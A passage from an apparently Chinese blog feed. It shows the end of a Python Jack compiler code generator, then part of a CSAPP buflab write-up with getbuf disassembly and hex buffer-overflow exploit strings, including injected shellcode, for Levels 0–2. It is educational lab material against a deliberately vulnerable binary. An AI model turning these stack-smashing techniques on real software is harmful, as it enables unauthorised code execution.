&#x27;;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">if</span> self.subtype == <span class="string">&quot;void&quot;</span>:</span><br><span class="line">            self.out.writePush(<span class="string">&quot;constant&quot;</span>,<span class="number">0</span>)</span><br><span class="line">        self.out.writeReturn()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeIfCode</span>(<span class="params">self</span>):</span><br><span class="line">        label = self.ifLabel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse if </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        self.out.writeSigArithmetic(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">        <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse &#x27;&#123;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.out.writeIf(label[<span class="number">1</span>])</span><br><span class="line">        self.writeStatementsCode()</span><br><span class="line">        self.out.writeGoto(label[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># parse &#x27;&#125;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">   </span><br><span class="line">        <span class="comment"># parse else</span></span><br><span class="line">        self.out.writeLabel(label[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;else&quot;</span>:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse &#x27;else&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse &#x27;&#123;&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse statements</span></span><br><span class="line">            self.writeStatementsCode()</span><br><span class="line">            <span class="comment"># parse &#x27;&#125;&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">        self.out.writeLabel(label[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeExpressionCode</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># parse term</span></span><br><span class="line">        self.writeTermCode()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse op</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.symbol() == <span class="string">&quot;+&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;-&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;*&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;/&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&amp;&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;|&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&gt;&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;&lt;&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;=&quot;</span>):</span><br><span class="line">            <span class="comment"># parse op</span></span><br><span class="line">            op = self.parser.symbol()</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse term</span></span><br><span class="line">            self.writeTermCode()</span><br><span class="line">            <span class="comment"># code write op</span></span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                self.out.writeCall(<span class="string">&quot;Math.multiply&quot;</span>,<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                self.out.writeCall(<span class="string">&quot;Math.divide&quot;</span>,<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.out.writeArithmetic(op)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeTermCode</span>(<span class="params">self</span>):</span><br><span class="line">        varname = <span class="string">&quot;&quot;</span></span><br><span class="line">        vartype = <span class="string">&quot;&quot;</span></span><br><span class="line">        varkind = <span class="string">&quot;&quot;</span></span><br><span class="line">        varidx  = <span class="number">0</span></span><br><span class="line">        paramCnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            <span class="comment"># push constant x</span></span><br><span class="line">            self.out.writePush(<span class="string">&quot;constant&quot;</span>,self.parser.intVal())</span><br><span class="line">            <span class="comment">#print(self.parser.intVal())</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            <span class="comment"># push string x</span></span><br><span class="line">            val = self.parser.stringVal()</span><br><span class="line">            self.out.writePush(<span class="string">&quot;constant&quot;</span>,<span class="built_in">len</span>(val))</span><br><span class="line">            self.out.writeCall(<span class="string">&quot;String.new&quot;</span>,<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> val:</span><br><span class="line">                self.out.writePush(<span class="string">&quot;constant&quot;</span>,<span class="built_in">ord</span>(c))</span><br><span class="line">                self.out.writeCall(<span class="string">&quot;String.appendChar&quot;</span>,<span class="number">2</span>)</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            <span class="comment"># parse keword const</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;false&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">               self.parser.keyWord() == <span class="string">&quot;null&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;this&quot;</span>:</span><br><span class="line">                <span class="keyword">if</span> self.parser.keyWord() == <span class="string">&quot;true&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;constant&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                    self.out.writeSigArithmetic(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;false&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;constant&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;null&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;constant&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;this&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;pointer&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">if</span> self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">                <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.writeExpressionCode()</span><br><span class="line">                <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                (self.parser.symbol() == <span class="string">&quot;-&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;~&quot;</span>):</span><br><span class="line">                <span class="comment"># parse unaryOp</span></span><br><span class="line">                op = self.parser.symbol()</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse term</span></span><br><span class="line">                self.writeTermCode()</span><br><span class="line">                self.out.writeSigArithmetic(op)</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            <span class="comment"># skip varname</span></span><br><span class="line">            termname = self.parser.currToken()</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># we push the head arrdress of the array</span></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">                <span class="comment"># parse subroutineName or varName            </span></span><br><span class="line">                <span class="keyword">if</span> self.subTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.subTable.typeOf(termname)</span><br><span class="line">                    varkind = self.subTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.subTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">elif</span>  self.classTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.classTable.typeOf(termname)</span><br><span class="line">                    varkind = self.classTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.classTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;invalid var statement!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse &#x27;[&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.writeExpressionCode()</span><br><span class="line">                 <span class="comment"># parse var type </span></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">                <span class="comment"># add</span></span><br><span class="line">                self.out.writeArithmetic(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">                self.out.writePop(<span class="string">&quot;pointer&quot;</span>,<span class="number">1</span>)</span><br><span class="line">                self.out.writePush(<span class="string">&quot;that&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse &#x27;]&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="comment"># parse subcall</span></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                <span class="comment"># parse &#x27;.&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse subroutineName</span></span><br><span class="line">                termfunc = self.parser.currToken()</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse call name</span></span><br><span class="line">                <span class="keyword">if</span> self.subTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.subTable.typeOf(termname)</span><br><span class="line">                    varkind = self.subTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.subTable.indexOf(termname)</span><br><span class="line">                    paramCnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span>  self.classTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.classTable.typeOf(termname)</span><br><span class="line">                    varkind = self.classTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.classTable.indexOf(termname)</span><br><span class="line">                    paramCnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">                    <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                        self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    vartype = termname</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                paramCnt += self.writeExpressionListCode()</span><br><span class="line">                <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># write var code</span></span><br><span class="line">                self.out.writeCall(vartype + <span class="string">&quot;.&quot;</span> + termfunc,paramCnt)</span><br><span class="line">            <span class="comment"># parse call</span></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">                <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.out.writePush(<span class="string">&quot;pointer&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                paramCnt = self.writeExpressionListCode() + <span class="number">1</span></span><br><span class="line">                <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># write var code</span></span><br><span class="line">                self.out.writeCall(self.classname + <span class="string">&quot;.&quot;</span> + termfunc,paramCnt)</span><br><span class="line">                <span class="comment"># print(self.classname + &quot;.&quot; + termfunc + str(paramCnt))</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># parse subroutineName or varName            </span></span><br><span class="line">                <span class="keyword">if</span> self.subTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.subTable.typeOf(termname)</span><br><span class="line">                    varkind = self.subTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.subTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">elif</span>  self.classTable.indexOf(termname) &gt;= <span class="number">0</span>:</span><br><span class="line">                    vartype = self.classTable.typeOf(termname)</span><br><span class="line">                    varkind = self.classTable.kindOf(termname)</span><br><span class="line">                    varidx =  self.classTable.indexOf(termname)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;invalid var statement!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeExpressionListCode</span>(<span class="params">self</span>):</span><br><span class="line">        argsCnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.symbol() == <span class="string">&#x27;)&#x27;</span> <span class="keyword">and</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">return</span> argsCnt</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        argsCnt += <span class="number">1</span></span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse `, expression`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.symbol() == <span class="string">&#x27;,&#x27;</span> <span class="keyword">and</span> \</span><br><span class="line">              self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="comment"># parse &#x27;,&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            argsCnt += <span class="number">1</span></span><br><span class="line">            self.writeExpressionCode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> argsCnt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="built_in">input</span>):</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(<span class="built_in">input</span>):</span><br><span class="line">            files = os.listdir(<span class="built_in">input</span>)</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">                filename = <span class="built_in">input</span>+f</span><br><span class="line">                <span class="keyword">if</span> filename.find(<span class="string">&quot;.jack&quot;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    CompileCodeWriter(<span class="built_in">input</span>+f)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            CompileCodeWriter(<span class="built_in">input</span>)            </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invalid path&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>build a computer</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【CSAPP】 lab3</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/81/</url>
    <content><![CDATA[<h1 id="CSAPP-lab3-bufboomb"><a href="#CSAPP-lab3-bufboomb" class="headerlink" title="CSAPP lab3 bufboomb"></a>CSAPP lab3 bufboomb</h1><p>本次实验的<code>project</code>为<code>buflab</code>，这个<code>lab</code>比上次<code>lab2</code>有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的<code>lab</code>主要为详细描述缓冲区溢出的<code>shellcode</code>编写，每个小的<code>case</code>非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个<code>case</code>全部通过，通过这<code>5</code>个<code>case</code>基本熟悉了<code>shellcode</code>的编写和缓冲区溢出的攻击原理，本质是利用堆栈模型的漏洞，利用函数返回值的跳转来进行不同的跳转。</p>
<ul>
<li>首先我们需要了解程序的调用过程和基本的汇编命令的指令的原理：</li>
</ul>
<ol>
<li><code>call</code> 指令的执行原理：<code>Call address</code>,将下一条指令的地址入栈，然后跳转到<code>address</code>对应的指令。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push [next]</span><br><span class="line">jmp address</span><br></pre></td></tr></table></figure></li>
<li><code>ret</code>指令的执行原理，<code>ret</code>将栈顶的数据出栈送入到<code>eip</code>寄存器，然后进行跳转。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %eip,</span><br><span class="line">jmp</span><br></pre></td></tr></table></figure></li>
<li>堆栈中<code>procedure</code>的调用的基本过程，将被调用的函数的参数从右至左依次入栈;将下一条指令入栈，跳转到函数进行执行;进入到被执行的函数时，首先会将当前的<code>ebp</code>入栈。<br><img src="https://i.loli.net/2020/11/26/DFieZPoyp7hnsW4.png" alt="1"><br>搞清楚以上三点的信息后，对这<code>5</code>个<code>case</code>就能非常熟悉和了解了。</li>
</ol>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关于<code>getbuf</code>函数的原型:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    <span class="built_in">Gets</span>(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到<code>getbuf</code>函数中栈上的申请的字符串的长度为<code>32</code>，我们缓冲区的溢出的原理也是对<code>buf</code>的空间进行连续的填充，直到将<code>getbuf</code>函数的返回指令的地址用我们自定义的地址进行覆盖，从而执行完<code>getbuf</code>函数后，在返回时将会跳转到我们所需要的地址即可。我们同时仔细分析一下<code>getbuf</code>函数的汇编代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">080491f</span>4 &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">80491f</span>4:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">80491f</span>5:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80491f</span>7:       <span class="number">83</span> ec <span class="number">38</span>                sub    $<span class="number">0x38</span>,%esp</span><br><span class="line"> <span class="number">80491f</span>a:       <span class="number">8</span>d <span class="number">45</span> d8                lea    <span class="number">-0x28</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80491f</span>d:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8049200</span>:       e8 f5 fa ff ff          call   <span class="number">8048</span>cfa &lt;Gets&gt;</span><br><span class="line"> <span class="number">8049205</span>:       b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x1</span>,%eax</span><br><span class="line"> <span class="number">804920</span>a:       c9                      leave</span><br><span class="line"> <span class="number">804920b</span>:       c3                      ret</span><br></pre></td></tr></table></figure>
<p>从汇编代码中可以知道<code>buff</code>的偏移地址第<code>(0x28 + 8)</code>存储的为函数返回地址，所以我们只需要将<code>offset = (0x28 + 8)</code>的空间进行自定义填充即可，以下所有的题目基本上都类似的原理。</p>
<h3 id="1-Level-0-Candle"><a href="#1-Level-0-Candle" class="headerlink" title="1. Level 0: Candle"></a>1. Level 0: Candle</h3><ul>
<li>题目非常简单，只是要求能够正确执行函数<code>smoke</code>即可，我们只需要将<code>smoke</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可。<br><img src="https://i.loli.net/2020/11/26/nJHl9QcwD3qMUzT.png" alt="1"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-Level-1-Sparkler"><a href="#2-Level-1-Sparkler" class="headerlink" title="2. Level 1: Sparkler"></a>2. Level 1: Sparkler</h3><ul>
<li>题目非常简单，只是要求能够正确执行函数<code>fizz</code>即可，我们只需要将<code>fizz</code>函数的地址写入<code>getbuf</code>的返回地址即可,我们只需要将<code>08048c18</code>写入返回地址即可,与<code>level1</code>不一样的是还需要把参数<code>val</code>参数传入，并且此时参数的值为<code>cookie</code>的值，我们知道参数的偏移地址<code>offset = (0x28 + 12)</code>，我们只需要在此偏移处填入<code>cookie</code>的值即可。<br><img src="https://i.loli.net/2020/11/26/3W4eXo6zNFVnSCO.png" alt="2"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 42 8c 04 08 08 d1 08 04 00</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-Level-2-Firecracker"><a href="#3-Level-2-Firecracker" class="headerlink" title="3.Level 2: Firecracker"></a>3.Level 2: Firecracker</h3><ul>
<li>这个稍微复杂点，只是要求能够正确执行函数<code>bang</code>，并且要求<code>global_value</code>的值与<code>cookie</code>的值相等，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改。此题需要在栈上写入指令，并且执行栈上的指令修改全局变量的值，执行完成后跳转到<code>bang</code>函数即可。</li>
<li>我们通过C语言写入汇编代码，然后进行编译翻译成机器指令即可，再将填入到栈中即可，需要执行的指令如下：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov $0x6830c384, %eax&quot;</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">&quot;mov %eax,0x804d100&quot;</span>);    <span class="comment">// global_value = cookie</span></span><br><span class="line">    __asm__(<span class="string">&quot;push $0x08048c9d&quot;</span>);      <span class="comment">// set bang return address</span></span><br><span class="line">    __asm__(<span class="string">&quot;ret&quot;</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://i.loli.net/2020/11/26/gzNHyfrudtTAWpq.png" alt="3"></li>
<li>本次即需要两次跳转，第一次跳转到栈上的指令起始地址<code>0x55682fb8</code>，设置全局变量；执行完成指令后进行第二次跳转到<code>bang</code>函数的入口地址<code>0x08048c9d</code>，最后的结果为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b8 84 c3 30 68 a3 00 d1 04 08 68 9d 8c 04 08 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 2f 68 55</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-Level-3-Dynamite"><a href="#4-Level-3-Dynamite" class="headerlink" title="4. Level 3: Dynamite"></a>4. Level 3: Dynamite</h3><ul>
<li>这个就比较复杂，需要改变<code>test</code>函数的执行逻辑，这就要求我们不仅返回执行<code>bang</code>函数，还需要对<code>global_value</code>的值进行更改，并且保证<code>test</code>函数最终能够正常运行。<code>test</code>函数原本逻辑如下所示：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = <span class="built_in">uniqueval</span>(); </span><br><span class="line"></span><br><span class="line">    val = <span class="built_in">getbuf</span>(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != <span class="built_in">uniqueval</span>()) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span 